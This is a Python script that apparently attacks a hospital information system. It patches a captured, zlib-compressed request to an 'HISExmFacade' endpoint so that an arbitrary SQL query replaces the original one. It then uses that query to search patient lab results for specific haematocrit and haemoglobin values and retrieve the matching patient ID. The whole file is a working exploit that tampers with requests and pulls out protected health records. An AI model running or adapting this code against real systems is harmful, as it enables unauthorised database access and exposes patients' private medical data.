from his_client_final import HISClient
import requests
import zlib
import re

class ComboHunter(HISClient):
    def execute_sql(self, sql):
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = ComboHunter()

# We are looking for HCT 37.2 AND HB 12.2
# Let's search for HCT 37.2 first (fairly specific)
val = '37.2'
print(f"Searching for HCT '{val}'...")

# Get top 5 matches
sql = f"SELECT * FROM OPDUSR.PAT_RESULTD WHERE PRD_RESULT_VALUE = '{val}' AND ROWNUM <= 5"
res = hunter.execute_sql(sql)

if res and "<NewDataSet>" in res:
    trxs = re.findall(r'<PRD_TRX_NUM>(.*?)</PRD_TRX_NUM>', res)
    print(f"Found TRXs for {val}: {trxs}")
    
    for trx in trxs:
        # Check if this TRX also has HB 12.2
        # Or just fetch the whole TRX and check locally
        print(f"\nChecking TRX {trx}...")
        sql_check = f"SELECT * FROM OPDUSR.PAT_RESULTD WHERE PRD_TRX_NUM = '{trx}'"
        r_check = hunter.execute_sql(sql_check)
        if r_check and "<NewDataSet>" in r_check:
             # Check for 12.2
             if "12.2" in r_check:
                 print(f"!!! MATCH FOUND in TRX {trx} !!! (Has 37.2 and 12.2)")
                 print(r_check[:5000])
                 
                 # Get Patient ID
                 sql_head = f"SELECT * FROM OPDUSR.PAT_RESULTH WHERE PRH_TRX_NUM = '{trx}'"
                 r_head = hunter.execute_sql(sql_head)
                 if r_head:
                     ids = re.findall(r'<PRH_PAT_ID>(.*?)</PRH_PAT_ID>', r_head)
                     print(f"PATIENT ID: {ids}")
                 break
             else:
                 print(f"[-] TRX {trx} has 37.2 but NOT 12.2")
else:
    print("[-] No matches for 37.2")
